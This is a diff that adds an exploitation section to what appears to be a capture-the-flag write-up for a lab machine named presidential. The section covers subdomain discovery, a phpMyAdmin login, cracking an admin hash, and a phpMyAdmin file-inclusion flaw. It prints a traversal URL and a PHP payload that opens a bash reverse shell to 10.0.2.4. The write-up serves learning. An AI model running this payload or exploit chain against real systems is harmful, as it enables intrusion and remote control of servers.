@@ -44,6 +44,31 @@ In fact, the file contains the user's credentials which could prove useful later
 
 ## Exploiting
 
+Using Gobuster, this time with the vhost option, subdomains can be found. With the dictionary used (/dirbuster/wordlists/directory-list-2.3-medium.txt) a single subdomain was found: datasafe.votenow.local.
+On the web page that is obtained by connecting to the subdomain, there is an access panel to "phpMyAdmin". By entering the credentials obtained previously it is possible to log in and by navigating the page you can access a SQL database containing the hash of the password of an admin user.
+
+The hash alone cannot be used. John the Ripper is a tool to use to crack the password. With the famous rockyou dictionary you can force the password corresponding to the hash, which turns out to be Stella.
+
+Browsing the page another thing you can easily notice is that the version of phpMyAdmin is old. Searchsploit is a tool that can be used to search for known exploits and vulnerabilities in different versions of software and operating systems.
+It turns out there are three vulnerabilities, one of which has command execution as impact. Searchsploit can give us more information about this vulnerability and how it can be exploited.
+To exploit this vulnerability it is necessary to:
+1) be authenticated
+2) get the phpMyAdmin cookie
+3) run a SQL query
+4) edit the URL accurately.
+Authentication was done with the credentials obtained previously.
+The phpMyAdmin cookie can be obtained by using the browser inspector and seeing what the value of the cookie named phpMyAdmin is.
+On the web page we are allowed to execute SQL queries.
+The normal functioning of the web application does not allow the interpretation and execution of code inserted in the backticks. However, by carefully structuring the URL and inserting a php script between backticks into a SQL query, it is possible to obtain the execution of the script.
+The URL must have the following format:
+http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/ php/session/sess_{cookieValue}
+where {cookieValue} is the cookie value of a current session.
+
+By listening to a netcat listener on port 443 and then injecting a SQL query like this:
+select '<?php system("bash -i >& /dev/tcp/10.0.2.4/443 0>&1");?>'
+and by structuring the URL in the way illustrated, you obtain a reverse shell on the presidential machine.
+
+At this point you can authenticate with the admin user credentials extracted previously.
 
 
 ## Privilege Escalation
